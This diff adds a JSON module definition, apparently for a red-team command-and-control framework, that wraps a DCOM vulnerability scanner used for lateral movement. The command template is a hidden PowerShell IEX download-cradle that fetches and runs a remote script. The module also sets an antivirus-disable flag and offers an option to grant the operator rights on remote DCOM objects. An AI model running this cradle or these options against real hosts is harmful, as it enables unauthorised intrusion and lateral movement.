@@ -1,0 +1,61 @@
+{
+  "base": {
+    "type": "standard",
+    "name": "Invoke-DCOMObjectScan",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Nimrod Levy (@el3ct71k)"],
+    "path": ["windows", "x64", "powershell", "lateral", "dcom", "Invoke-DCOMObjectScan.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "PowerShell",
+    "privilege": false,
+    "notes": "\r\n\r\nInvoke-DCOMObjectScan is part of the D(COM) V(ulnerability) S(canner) (DVS) Framework at https://github.com/ScorpionesLabs/DVS.\r\n\r\nExample:\r\nEnumerates and Scan MMC20.Application (ProgID) object from the attacker machine to the DC01 host without querying the registry.\r\nInvoke-DCOMObjectScan -Type Single -ObjectName \"MMC20.Application\" -HostList DC01 -SkipRegAuth -Username \"lab\\administrator\" -Password \"Aa123456!\" -Verbose\r\n",
+    "remote": "https://raw.githubusercontent.com/ScorpionesLabs/DVS/master/DVS.psm1",
+    "local": ["data", "src", "ScorpionesLabs", "DVS", "DVS.psm1"],
+    "options": [
+      {"name": "Type", "value": "Single", "required": true, "flag": "-Type", "description":"Specifies the scan type: All, List, Single"},
+      {"name": "HostList", "value": null, "required": false, "flag": "-HostList", "description":"Specifies IPAddresses, CIDR ranges or hostnames to interact with (Default: 127.0.0.1)."},
+      {"name": "MaxDepth", "value": "", "required": false, "flag": "-MaxDepth", "description":"Specifies the maximum depth of DCOM object."},
+      {"name": "MaxResults", "value": null, "required": false, "flag": "-MaxResults", "description":"Specifies the max amount of usable function within each scanned object"},
+      {"name": "FunctionListFile", "value": null, "required": false, "flag": "-FunctionListFile", "description":"Specifies the function/method list file that contains"},
+      {"name": "ObjectListFile", "value": null, "required": false, "flag": "-ObjectListFile", "description":"Specifies the DCOM Object list to scan (Available only on \"List\" type) - PLEASE PROVIDE FULL PATH (i.e. c:\\object_list.txt)"},
+      {"name": "ObjectName", "value": "MMC20.Application", "required": false, "flag": "-ObjectName", "description":"Specifies the exact DCOM Object to scan (Available only on \"Single\" type)."},
+      {"name": "Username", "value": null, "required": false, "flag": "-Username", "description":"Specifies the username to use for access."},
+      {"name": "Password", "value": null, "required": false, "flag": "-Password", "description":"Specifies the password to use for access."},
+      {"name": "AutoGrant", "value": null, "required": false, "flag": "-AutoGrant", "description":"AutoGrant mode allows you to grant yourself permission to the remote DCOM object."},
+      {"name": "CheckAccessOnly", "value": null, "required": false, "flag": "-CheckAccessOnly", "description":"Show you only accessible DCOM objects without scanning."},
+      {"name": "SkipPermissionChecks", "value": null, "required": false, "flag": "-SkipPermissionChecks", "description":"Try to blindly launch the remote object, without checking if the principal-identity have access to it using (Will not analyze ACL permissions)."},
+      {"name": "SkipRegAuth", "value": null, "required": false, "flag": "-SkipRegAuth", "description":""},
+      {"name": "Verbose", "value": "", "required": false, "flag": "-Verbose", "description":"Get Verbose logging"}
+    ],
+    "description": "Invoke-DCOMObjectScan function allows you to scan DCOM objects and find vulnerable functions via a list of patterns or exact function names that you included in a file.",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w", "0",
+      "\"IEX",
+      "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ScorpionesLabs/DVS/master/DVS.psm1');",
+      "Invoke-DCOMObjectScan",
+      "{{Type}}",
+      "{{HostList}}",
+      "{{MaxDepth}}",
+      "{{MaxResults}}",
+      "{{FunctionListFile}}",
+      "{{ObjectListFile}}",
+      "{{ObjectName}}",
+      "{{Username}}",
+      "{{Password}}",
+      "{{AutoGrant.Flag}}",
+      "{{CheckAccessOnly.Flag}}",
+      "{{SkipPermissionChecks.Flag}}",
+      "{{SkipRegAuth.Flag}}",
+      "{{Verbose.Flag}}",
+      "\""
+    ]
+  },
+  "powershell": {
+    "disableav": true,
+    "obfuscate": false,
+    "base64": false
+  }
+}
